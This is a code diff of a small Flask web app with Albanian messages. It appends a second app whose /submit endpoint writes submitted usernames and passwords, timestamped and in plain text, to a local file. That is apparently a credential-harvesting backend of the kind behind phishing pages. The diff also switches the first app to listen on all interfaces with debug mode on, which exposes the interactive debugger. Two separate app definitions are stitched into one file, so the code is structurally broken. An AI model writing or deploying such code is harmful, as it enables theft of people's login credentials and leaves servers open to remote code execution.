@@ -26,4 +26,23 @@ def home():
     """
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host="0.0.0.0", port=5000, debug=True)
+from flask import Flask, request
+from datetime import datetime
+
+app = Flask(__name__)
+DATA_FILE = "te_dhenat.txt"
+
+@app.route("/submit", methods=["POST"])
+def submit():
+    username = request.form.get("username", "")
+    password = request.form.get("password", "")
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    with open(DATA_FILE, "a", encoding="utf-8") as f:
+        f.write(f"[{timestamp}] Username: {username} | Password: {password}\n")
+
+    return "Të dhënat u ruajtën me sukses."
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=10000)
